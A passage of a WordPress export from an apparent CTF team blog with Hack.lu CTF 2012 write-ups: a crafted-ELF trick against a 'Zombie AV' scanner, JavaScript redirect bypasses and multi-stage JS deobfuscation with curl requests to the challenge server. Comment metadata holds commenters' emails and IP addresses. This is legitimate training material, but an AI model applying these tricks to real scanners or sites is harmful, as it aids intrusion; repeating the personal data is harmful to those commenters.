8048334: 90 nop
8048335: 90 nop
8048336: 90 nop
8048337: 90 nop
8048338: 90 nop
8048339: 90 nop
804833a: cd 80 int $0x80
804833c: b0 84 mov $0x84,%al
804833e: 04 08 add $0x8,%al
8048340: 68 50 84 04 08 push $0x8048450
8048345: 51 push %ecx
8048346: 56 push %esi
8048347: 68 04 84 04 08 push $0x8048404
804834c: e8 bf ff ff ff call 8048310 &lt;__libc_start_main@plt&gt;
8048351: f4 hlt
8048352: 90
Entry Opcodes are: b0 01 90 90 90 90 90 90 90 90 cd 80
Signature is: cd53b957ec552afb39cba6daed7a9abc
found zombie virus, trying to execute it
&lt;?php

$readelfpath='/usr/bin/readelf';
$objdumppath='/usr/bin/objdump';
$uploadpath='upload/';
$scriptpath='/var/www/';
$secret='55c4080daefb5f794c3527101882b50b';

?&gt;
done we are safe

[/text]

Automagically [php]$secret='55c4080daefb5f794c3527101882b50b';[/php]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>117</wp:post_id>
		<wp:post_date>2012-10-25 20:15:18</wp:post_date>
		<wp:post_date_gmt>2012-10-25 12:15:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-lu-ctf-zombie-av</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="category" nicename="hack-lu"><![CDATA[Hack.lu]]></category>
		<category domain="post_tag" nicename="hack-lu-2012"><![CDATA[hack.lu 2012]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>3</wp:comment_id>
			<wp:comment_author><![CDATA[Miles]]></wp:comment_author>
			<wp:comment_author_email>pkordy@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>158.64.77.102</wp:comment_author_IP>
			<wp:comment_date>2012-10-26 00:03:02</wp:comment_date>
			<wp:comment_date_gmt>2012-10-25 16:03:02</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[It may be not obvious why the signature code does not exit. The explanation is that only AL is set to 0. In AH there may be garbage, so INT 80h will not fire.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>4</wp:comment_id>
			<wp:comment_author><![CDATA[amon]]></wp:comment_author>
			<wp:comment_author_email>jergorn93@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>202.156.8.14</wp:comment_author_IP>
			<wp:comment_date>2012-10-26 22:30:03</wp:comment_date>
			<wp:comment_date_gmt>2012-10-26 14:30:03</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[That is interesting! Thanks for pointing that out, we didn't notice it during the time. Completely forgot that registers may not be in a clean state.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>3</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Hack.lu CTF 2012 Nerd Safehouse</title>
		<link>http://nandynarwhals.org/2012/10/27/hack-lu-ctf-2012-nerd-safehouse/</link>
		<pubDate>Fri, 26 Oct 2012 16:03:55 +0000</pubDate>
		<dc:creator>dynadolos</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=139</guid>
		<description></description>
		<content:encoded><![CDATA[<em>"Try solving the annoying puzzle at https://ctf.fluxfingers.net:2074/ </em><em>or zombies will eat your soul!"</em>

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/01cropped.png"><img class="alignnone size-large wp-image-140" title="01cropped" src="http://nandynarwhals.org/wp-content/uploads/2012/10/01cropped-1024x554.png" alt="" width="584" height="315" /></a>

Upon entering the page specified in the puzzle, we were directed to a blank page (<a href="https://ctf.fluxfingers.net:2074/?cid=vp3E1nOGh7jwP">https://ctf.fluxfingers.net:2074/?cid=vp3E1nOGh7jwP</a>) as seen above. Our first instinct was to view the source of this page for any clues. Taking a look at the source, we found the following script:<!--more-->

&lt;script&gt;history.replaceState(0,0,'?cid=vp3E1nOGh7jwP');&lt;/script&gt;

By then, it was quite obvious that the redirection was caused by that line of code. Hence, we decided to disable javascript in our browser to prevent the redirection. We then loaded the page: "<em>https://ctf.fluxfingers.net:2074/" </em>once again. This time we entered a similar page as the one above.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/05cropped.png"><img class="alignnone size-full wp-image-145" title="05cropped" src="http://nandynarwhals.org/wp-content/uploads/2012/10/05cropped.png" alt="" width="1367" height="735" /></a>

However, we noticed that the url for this page differed slightly. Instead of "https://ctf.fluxfingers.net:2074/?cid=vp3E1nOGh7<strong>j</strong>wP", it was now "https://ctf.fluxfingers.net:2074/?cid=vp3E1nOGh7<strong>i</strong>wP".

We then proceeded to check the source for this page and found the following:

&lt;script&gt; location.href = atob('P2NpZD12cDNFbG5PR2g3andQ'); &lt;/script&gt;

<img class="alignnone size-large wp-image-143" title="03cropped" src="http://nandynarwhals.org/wp-content/uploads/2012/10/03cropped-1024x552.png" alt="" width="584" height="314" />

From this script, we can see that the atob() method was being used to decode a string encoded in base64 (P2NpZD12cDNFbG5PR2g3andQ). We then decoded the base64 string and got the following:

?cid=vp3ElnOGh7jwP

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/04cropped.png"><img class="alignnone size-large wp-image-144" title="04cropped" src="http://nandynarwhals.org/wp-content/uploads/2012/10/04cropped-1024x553.png" alt="" width="584" height="315" /></a>

All that was left was to replace the <strong>cid </strong>parameter with the new one and reload the page. We were once again faced with the same blank page, except that the flag was present in the source this time as a comment:

&lt;!-- The secret is 14574e443ef2331439d25dc9da3b617e :D --&gt;

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/cropped02.png"><img class="alignnone size-large wp-image-141" title="cropped02" src="http://nandynarwhals.org/wp-content/uploads/2012/10/cropped02-1024x552.png" alt="" width="584" height="314" /></a>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>139</wp:post_id>
		<wp:post_date>2012-10-27 00:03:55</wp:post_date>
		<wp:post_date_gmt>2012-10-26 16:03:55</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-lu-ctf-2012-nerd-safehouse</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hack-lu"><![CDATA[Hack.lu]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack.lu CTF 2012 Mini Zombie Business</title>
		<link>http://nandynarwhals.org/2012/10/28/hack-lu-ctf-2012-mini-zombie-business/</link>
		<pubDate>Sun, 28 Oct 2012 07:41:44 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=159</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030127.png"><img class="alignnone size-large wp-image-166" title="Screenshot at 2012-10-28 03:01:27" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030127-1024x575.png" alt="" width="584" height="327" /></a>
<blockquote>22 - Mini Zombie Business

As time passes by and the zombie apocalypse seems to stay for a while businesses have to adapt to survive. Food store chains offer brains and biscuits for their limping customers and fox on Fire seems to be a all-time-zombie-favourite, too. Since a lot of zombies have a broad band connection businesses strive to get online stores back up again. It's just that webdesign seems to be quite hard for zombie employees. They obfuscate all their code (god knows why).

Here is an example of a miserable attempt to create a working website.

https://ctf.fluxfingers.net:2076/mini/</blockquote>
<!--more-->Download the original website here: <a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Mini-Zombie-Business.tar.gz">Mini Zombie Business.tar.gz</a>.

If we look at the source, we can see that there is a custom data attribute in a form tag (data-a) that contains encrypted data which we can assume is decrypted by the obfuscated javascript.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030121.png"><img class="alignnone size-large wp-image-168" title="Screenshot at 2012-10-28 03:01:21" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030121-1024x575.png" alt="" width="584" height="327" /></a>

It is interesting to note that opening the site in Chrome yields errors from running the javascript so we have to use Firefox ('fox on Fire', lol) to run the code successfully.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-153032.png"><img class="alignnone size-large wp-image-170" title="Screenshot at 2012-10-28 15:30:32" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-153032-1024x575.png" alt="" width="584" height="327" /></a>

After the code is run, it writes data to the div tag in the data-a attribute which creates the function dafuq. It's then trivial to see that the function spawns a prompt that takes the string 'tasty brainz' and then prints the flag 'tasty_humans_all_day_erry_day'. The function can be called by clicking on the image.

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030139.png"><img class="alignnone size-large wp-image-172" title="Screenshot at 2012-10-28 03:01:39" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030139-1024x575.png" alt="" width="584" height="327" /></a>

<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030142.png"><img class="alignnone size-large wp-image-173" title="Screenshot at 2012-10-28 03:01:42" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030142-1024x575.png" alt="" width="584" height="327" /></a>

<strong>Flag: tasty_humans_all_day_erry_day</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>159</wp:post_id>
		<wp:post_date>2012-10-28 15:41:44</wp:post_date>
		<wp:post_date_gmt>2012-10-28 07:41:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-lu-ctf-2012-mini-zombie-business</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hack-lu"><![CDATA[Hack.lu]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_f48eec018310d9523e19262bdb06c5b0</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>5</wp:comment_id>
			<wp:comment_author><![CDATA[ateev]]></wp:comment_author>
			<wp:comment_author_email>ateev@live.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>115.248.155.250</wp:comment_author_IP>
			<wp:comment_date>2012-11-03 05:20:19</wp:comment_date>
			<wp:comment_date_gmt>2012-11-02 21:20:19</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[How to get this in firefox. I mean the &lt;div code ??  What have u used . A firefox extension. Please help]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>6</wp:comment_id>
			<wp:comment_author><![CDATA[amon]]></wp:comment_author>
			<wp:comment_author_email>jergorn93@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>202.156.8.14</wp:comment_author_IP>
			<wp:comment_date>2012-11-03 08:38:45</wp:comment_date>
			<wp:comment_date_gmt>2012-11-03 00:38:45</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I use firebug to observe the generate code after the Javascript executes.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>5</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Hack.lu CTF 2012 Big Zombie Business</title>
		<link>http://nandynarwhals.org/2012/10/28/hack-lu-ctf-2012-big-zombie-business/</link>
		<pubDate>Sun, 28 Oct 2012 11:07:42 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=176</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-170845.png"><img class="alignnone size-large wp-image-178" title="Screenshot at 2012-10-28 17:08:45" src="http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-170845-1024x575.png" alt="" width="584" height="327" /></a>
<blockquote>26 - Big Zombie Business

It's a disaster! Not only that these useless piles of rotten meat obfuscate all their stupid code, they have also lost our precious root password, or "Flag" as they call it. Is there a chance you can reverse this obfuscation to extract the Flag?

https://ctf.fluxfingers.net:2076/big/</blockquote>
<!--more-->You can download the page here: <a href="http://nandynarwhals.org/wp-content/uploads/2012/10/Big-Zombie-Business.tar.gz">Big Zombie Business.tar.gz</a>

At first look, the source code is a <em>mess</em>. Let's begin deobfuscating the first script tag (using python and jsbeautifier.org):

[javascript]
(function () {
    if (typeof console == undefined) console = {
        'log': function () {}
    };
    setInterval((function () {
        var c = console.log;
        var u = function () {
            c('%cBraaaaAAAINZZZZ', 'color:red;font-size:200px;')
        };
        u(), u(), u();
        return u
    })(), 100);
    f = function () {
        location = 'noflag'
    };
    n = {
        value: f,
        configurable: false
    };
    (a = document.addEventListener)('DOMAttrModified', f, false);
    a('DOMNodeInserted', f, false);
    a('DOMCharacterDataModified', f, false);
    for (i in m = ['write', 'writeln', 'createElement', 'appendChild', 'cloneNode', 'insertBefore', 'replaceChild', 'createElementNS']) Object.defineProperty(document.constructor.prototype, m[i], n);
    var y = alert;
    Object.defineProperty(window, 'alert', {
        value: function () {
            y('braaainzzz')
        },
        configurable: false
    });
    var z = prompt;
    Object.defineProperty(window, 'prompt', {
        value: function (q) {
            brain(z('What\'s my zombie name ? '), q)
        },
        configurable: false
    });
    for (i in m = ['confirm ', 'console'])
    Object.defineProperty(window, m[i], n);
})();
[/javascript]

We can see that this is where the the prompt we encounter on window open and the alert when we click on the picture of Charlie Sheen is defined. It's also interesting to see that references to the console are made which mean we should expect to see something appear on the javascript debug console.

The second script tag is deobfuscated:

[javascript]
with(new XMLHttpRequest()) {
    open('GET', '?i=31', false);
    send();
    if (status == 200) eval(responseText)
}
[/javascript]

We can see that a request is made to https://ctf.fluxfingers.net:2076/big/?i=31 and the received is eval'd. Let's see that this is:

[shell]
amon@Alyx:~/hacklu$ curl -k https://ctf.fluxfingers.net:2076/big/?i=31
\u0066\u006c\u0061\u0067="\x77\x72\x6f\x6e\x67\x66\x6c\x61\x67"
[/shell]

Deobfuscated this is:

[javascript]
flag="wrongflag"
[/javascript]

:/ Bit then we notice that the script tag has a 'src' attribute defined.

[shell]
<script type="text/javascript" src="./Big Zombie Business_files/javascript">// <![CDATA[
[/shell]

[javascript]
with(new XMLHttpRequest()) {
    open('GET', '?i=23', false);
    send();
    if (status === 200) eval(responseText)
}
[/javascript]

Grab the page:

[shell]
amon@Alyx:~/hacklu$ curl -k https://ctf.fluxfingers.net:2076/big/?i=23
... many many newlines ...
<!--
\u0077\u0069\u0074\u0068(\u006e\u0065\u0077 \u0058\u004d\u004c\u0048\u0074\u0074\u0070\u0052\u0065\u0071\u0075\u0065\u0073\u0074()){\u006f\u0070\u0065\u006e("\107\105\124","\077\151\07525",\u0066\u0061\u006c\u0073\u0065);\u0073\u0065\u006e\u0064();\u0069\u0066(\u0073\u0074\u0061\u0074\u0075\u0073==0xC8)\u0065\u0076\u0061\u006c(\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0054\u0065\u0078\u0074)}
[/shell]

[javascript]
with(new XMLHttpRequest()) {
    open("GET", "?i=25", false);
    send();
    if (status == 0xC8) eval(responseText)
}
[/javascript]

We can see a pattern here. Just keep grabbing the page and deobfuscating until we reach ?i=1337

[javascript]
function brain(a, b) {
    if (a === 'charlie fucking sheen') _(b)
}
brain.toString = brain.valueOf = r = function () {
    location = 'noflag'
};

function _(__) {
    var $ = document.querySelector('script').textContent;
    var $$ = '';
    for (var ___ = 0000000000; ___ < __.length; ___++) $$ += String['fromCharCode'](__.charCodeAt(___) ^ $.charCodeAt(___));
    Function($$)();
    alert('you are close');
}
_.toString = _.valueOf = r
[/javascript]

Well, we got a password of some kind: 'charlie fucking sheen'. Onwards to the first img tag, which has javascript in its onclick attribute:

[html]
onclick="location='javascript:alert(/braaaaainz/.source)'"
[/html]

This alerts the string 'braaaaainz'. Moving then to the next img tag, which has data in its src attribute (which is an invalid image and will trigger the onerror code).

[html]
onerror="prompt(atob(src.slice(23)))"
[/html]

This calls the prompt function defined in the first script tag with the base64 data in the src attribute. Looking back at the prompt definition:

[javascript]
Object.defineProperty(window, 'prompt', {
        value: function (q) {
            brain(z('What\'s my zombie name ? '),q)},configurable:false});for(i in m=['confirm ','console'])
[/javascript]

We can see that there's a call to the function brain which we found that we had to input the string 'charlie fucking sheen' to allow the _ function to run.

Deobfuscating the function generated by the _ function, we get:

[javascript]
(function(){x=document.querySelector('img')[fed];whoop='Flag: '+x[0]+x[377]+'_'+x[346]+x[377]+x[568]+'_'+x[18]+x[2]+x[5]+x[90]+x[90]+'_'+x[90]+x[5]+x[32]+x[9]+'_'+x[11]+x[1]+x[98]+x[1]+x[18]+x[131]+x[508]+x[5]+x[12]+x[2];/*alert(whoopa*/})()
[/javascript]

So, whoop is the variable that holds our flag! We may find the flag by executing the following 'exploit' code in the Firefox Firebug Console:

[javascript]
brain('charlie fucking sheen', atob('ADoAXlNCXzMbGBlMTWERX1NDCDkbRB5HRjkHSWNSWDkWRF9EEXscXVcRTwcTVVRrXl9BFDMFDRdwVT0SChARHVAHRW0bT29vQgdtHB4DUhtIbANoQ20bTm5vQgdtHR4HQAYIax0HA1IbSG0CZCgbSG1UAV5IawM4dw1rCQdudw1rCQY7d1JvFx0bB0wAbR1NZggBXkhrBAcBXkhrDzh3Um8XHUwHRAFtHU0HRG0bTm1lTW0bTmJtKBtIbVRkKBtIbQRvRG0bTm8cbE1tG05oaSgbSG1XbigbSG1XAU4fGlZfOQdEGEEOMxpAGRxMc18aHxkfF1QIdhsaG3YbGhh2GxsYDRBzWhoaGRl2Xx8fHR9zWhoaGUp2Xx8fHBlzWhoaGBt2Xx8fHBNzWhoaGUl2Xx8fHE8HBlFXUhR2Xx8fHRlzWhoaGRp2Xx8fHR5zWhoaGxZ2Xx8fHE9zWhoaGBt2Xx8fHB9zWhoaGB12Xx8fHRxzWhoaGR52Xx8fHEkHB3ZfHx8cHHNaGhoYGnZfHx8cT3NaGhoZHHZfHx8dHnNaGhoZFnZfHx8cTHNaGhoZSgIDVHNfGh8YHHZaHxocHnNfGh8YGApzWhoaGRwXdlofGhwcc18aHxlMdlofGhxKc18aHxgZdlofGhxJc18aHxlJdlofGhwaAXZfHx8cSXNaGhoZSXZfHx8cHRRzXxofGBx2Wh8aHB5zXxofGBgKc1oaGhgaF3ZaHxocGXNfGh8YH3ZaHxocSnNfGh8ZGXZaHxodG3NfGh8ZE3ZaHxocSXNfGh8ZTwIGVHZfHx8cGQcIdhobGnYbGxx2Gx8ddhsZHXYbGx52GxsedhsbHnYbGx52Gx8edhsfHnYbHx52Gx4edhseGXYbHB12GxwddhscHXYbHB0NBghzGx4ccxsfGHMbHxtzGx8YcxscHXMaHR1zGxwdcxseGnMbHhtzGh0ccxseGXMbHxhzGx8ZcxscG3MaHxpzGxwccxsfHnMbHR1zGx4acxodHXMaHB1zGhwfcxocH3MbHB9zGx0fcxodHAgDVxRzXxofGB8CBgN2Xx8fHR8HBgZ2Wh8aHRoHAxFzWhoaGB12Xx8fHB9zWhoaGBt2Xx8fHR9zWhoaGB12Xx8fHE8Pc18aHxgfVwYHAwYeHxoDFHNfGh8ZHBdzWhoaGRl2Xx8fHR9zWhoaGUp2Xx8fHBlzWhoaGBt2Xx8fHBNzWhoaGUl2Xx8fHE8HBlF2Wh8aHExzXxofGUx2Wh8aHBxzXxofGRt2Wh8aHRtzXxofGRN2Wh8aHElzXxofGU8XCHMbHxlzGx8YcxseGXMbHxtzGx4ecxseGAhXEXNaGhoZShdRc1oaGhgZdl8fHxwbc1oaGhlMdl8fHx0fc1oaGhkaEHZaHxocGQN2Xx8fHBlzWhoaGUl2Xx8fHE9zWhoaGRl2Xx8fHBNzWhoaGRh2Xx8fHR9zWhoaGB12Xx8fHBtzWhoaGR12Xx8fHElzWhoaGRoQdlofGhwZc18aHxkbdlofGhxMc18aHxgZdlofGhwaUhECc1oaGhkeF3ZaHxocG3NfGh8ZTHZaHxocHHNfGh8YH3ZaHxocS3NfGh8ZH3ZaHxocSnNfGh8YHgRzWhoaGR52Xx8fHB5zWhoaGRt2Xx8fHh9zWhoaGBl2Xx8fHB9zWhoaGUp2Xx8fHR5zWhoaG0x2Xx8fHBNzWhoaGBx2Xx8fHR5zWhoaGRp2Xx8fHE9zWhoaGRp2Xx8fHRgGBw12Hh8edh4eHXYeHh92Hh8bdh4ZHnYeGR52HhkYdh4eH3YeGh12Hhsedh4aG3YeGxx2Hhobdh4bH3YeGx4NA3NfGh8ZHAZzWhoaGRl2Xx8fHBtzWhoaGUx2Xx8fHRlzWhoaGRoDEU4HDXYeHx52Hh4ddh4eH3YeHhx2Hhoddh4bHnYeGx92Hh4bdh4aHHYeGRl2Hhsfdh4ZGHYeGR52Hhsfdh4bHg0Dc18aHxkcBnNaGhoZGXZfHx8cG3NaGhoZTHZfHx8dGXNaGhoZGgMRc1oaGhkeAg1zHhoecx4bHXMeGx9zHhoZcx4fGnMeHhtzHhwYcx4eG3MeHhlzHhwecx4eH3MeHBhzHhoecx4eG3MeHB5zHh4bcx4bH3MeHx1zHh4ecx4fG3MeHhxzHh8bcx4eH3MeHh4IA3ZfHx8cHANzXxofGRx2Wh8aHB5zXxofGUl2Wh8aHRxzXxofGR8DFHNfGh8ZHHZaHxocSXNfGh8YGAJzWhoaGRYKdlofGhwWc18aHxlPCnNaGhoZSxdxCHMbHBhzGxwdcxsfHnMbHBtzGx4aCAYNcx4cHXMeHBhzHh8bcx4cHnMeHh9zHh8ecx4fHAgDDXYeGxl2HhkYdh4bH3YeGxt2Hhkedh4bH3YeHx92Hhoedh4bH3YeGh92Hhsfdh4aHHYeGR4NAwh2GxsedhsZH3YbGR92GxsadhsaGXYbGxt2Gx8cdhsaH3YbGh52GxobdhsbGw0GCHMbHhxzGx8bcxsfGHMbHxlzGx4acxsbGXMbHxhzGx4bcxseGggGDXMeHxtzHh8ccx4cGXMeHh9zHhwYcx4cHnMeGhhzHh4fcx4eHHMeHx1zHhwYcx4eHwgDDXYeGRh2Hhsfdh4ZGnYeGh52Hhsbdh4bGXYeGx92Hh8Zdh4aGnYeGht2Hhoedh4bHg0DCHYbGxx2GxkddhsbGnYbGx52GxkbdhsbGnYbHxp2GxobdhsbGnYbGhp2GxsadhsaGXYbGRt2Gx4ZdhsdHA13BnNfGh8bTHZaHxocHXNfGh8ZS3ZaHxocGnNfGh8ZGXZaHxodGwF2Xx8fHB5zWhoaGRp2Xx8fHBxzWhoaGRZ2Xx8fHE9zWhoaGRp2Xx8fHxpzWhoaGB12Xx8fHExzWhoaGB92Xx8fHB9zWhoaGB12Xx8fHR5zWhoaGBYCdlofGhwbc18aHxlMdlofGhwcc18aHxgfdlofGhxLc18aHxkfdlofGhxKc18aHxgeBHNaGhoZHHZfHx8cTHNaGhoZSnZfHx8dGXNaGhoYG3ZfHx8dGHNaGhoYGnZfHx8cGXNaGhoYG3ZfHx8cTHNaGhoYHQR2Wh8aHR9zXxofGBh2Wh8aHElzXxofGB52Wh8aHElzXxofGB52Wh8aHRZzXxofGBp2Wh8aHBoDdl8fHxxOdHNfGh8ZE3cDc18aHxlPAxRzXxofGBx2Wh8aHB5zXxofGBgKc1oaGhgWF3ZaHxocHnNfGh8ZSXZaHxocGnNfGh8YGHZaHxodGxR2Xx8fHkxzWhoaGR12Xx8fHEtzWhoaGRp2Xx8fHBlzWhoaGBsEdlofGhwbc18aHxkfdlofGhwZc18aHxkTdlofGhxKc18aHxkfdlofGh8fc18aHxgYdlofGhxJc18aHxgadlofGhwac18aHxgYdlofGh0bVgJ2Wh8aHRhzXxofGRN2Wh8aHEpzXxofGR52Wh8aHElzXxofGB0GCHMbHh5zGx8bcxseGnMbHB1zGxwbCAZRc1oaGhgZdl8fHxwbc1oaGhlMdl8fHx0fc1oaGhkaEHZaHxocGXNfGh8YH3ZaHxocSnNfGh8ZGXZaHxodG3NfGh8ZE3ZaHxocSXNfGh8ZTwIGVHZfHx8dEwcIdhsbHXYbGR12GxsedhsbHnYbGx52GxoedhsaGXYbGB12GxgddhsYHQ0DUgN2Xx8fHBlzWhoaGUl2Xx8fHE9zWhoaGRl2Xx8fHBNzWhoaGRh2Xx8fHR9zWhoaGB12Xx8fHBtzWhoaGR12Xx8fHElzWhoaGRoQdlofGhwZc18aHxkbdlofGhxMc18aHxgZdlofGhwaUgMRc1oaGhgZdl8fHxwbc1oaGhgdCnZaHxodThJ2Xx8fHRpzWhoaGB12Xx8fHExzWhoaGUt2Xx8fHRpzWhoaGBsRdlofGh5Jc18aHxkYdlofGhxOc18aHxkfdlofGhwcc18aHxgeBHNaGhoZG3ZfHx8cH3NaGhoZGXZfHx8cE3NaGhoZSnZfHx8cH3NaGhoaH3ZfHx8dGHNaGhoZSXZfHx8dGnNaGhoZGnZfHx8dGHNaGhoYG3ZfHx8dEwdzXxofGB12Wh8aHBZzXxofGU92Wh8aHBtzXxofGUx2Wh8aHRgDDXYeGRp2HhkYdh4aHXYeGh92Hhkadh4ZHg0DVHZfHx8dHHNaGhoZHnZfHx8cSXNaGhoYGnZfHx8cHxVzXxofGRx2Wh8aHRpzXxofGU92Wh8aHBxzXxofGB52Wh8aHBZzXxofGUx2Wh8aHEoHdl8fHx0bBlRIWE5GRAJVBw12Hh0ddh4aGnYeGxt2Hhkedh8bHXYeGRl2Hxsadh4aH3YeGBt2Hxsadh4YGHYeGh12Hhofdh4bGHYeGht2Hhsfdh8bGnYeGhx2Hhsbdh4aH3YeGx92HxgdDQYDdl8fHx0bBlIGdlofGhwcc18aHxlMdlofGhxKc18aHxkcdlofGhwWc18aHxkddlofGh0ac18aHxgYdlofGhwec18aHxkYdlofGhxMc18aHxkfEHNaGhoZGXZfHx8cG3NaGhoZTHZfHx8dGXNaGhoZGlcDFHNfGh8ZHHZaHxocSXNfGh8YGAJzWhoaGRYKdlofGhwWc18aHxlPCnNaGhoZSxdxCHMbHhxzGx8YcxsfGXMbHhlzGx8ecxscHXMbHxoIBg1zHh4Zcx4fHXMeHxxzHhwZcx4fHXMeHx5zHh4fCHIDdlofGh5Jc18aHxkYdlofGhxOc18aHxkfdlofGhwcc18aHxgeBHNaGhoZG3ZfHx8cH3NaGhoZGXZfHx8cE3NaGhoZSnZfHx8cH3NaGhoaH3ZfHx8dGHNaGhoZSXZfHx8dGnNaGhoZGnZfHx8dGHNaGhoYG3ZfHx8dEwdzXxofGB12Wh8aHBZzXxofGU92Wh8aHBtzXxofGUx2Wh8aHRgDdl8fHxxOdHNfGh8ZE3cDc18aHxlPSBFSVAEBEg'))

whoop
[/javascript]

Result:

[shell]
>>> brain('charlie fucking sheen', atob('ADoAXlNCXzM...dl8fHxxOdHNfGh8ZE3cDc18aHxlPSBFSVAEBEg'))  whoop
"Flag: do_you_still_like_javascript"
[/shell]

Whew!

<strong>Flag: do_you_still_like_javascript</strong>
// ]]]]><![CDATA[></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>176</wp:post_id>
		<wp:post_date>2012-10-28 19:07:42</wp:post_date>
		<wp:post_date_gmt>2012-10-28 11:07:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-lu-ctf-2012-big-zombie-business</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hack-lu"><![CDATA[Hack.lu]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_08a899032e95c33c48c88fc0a97f9692</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
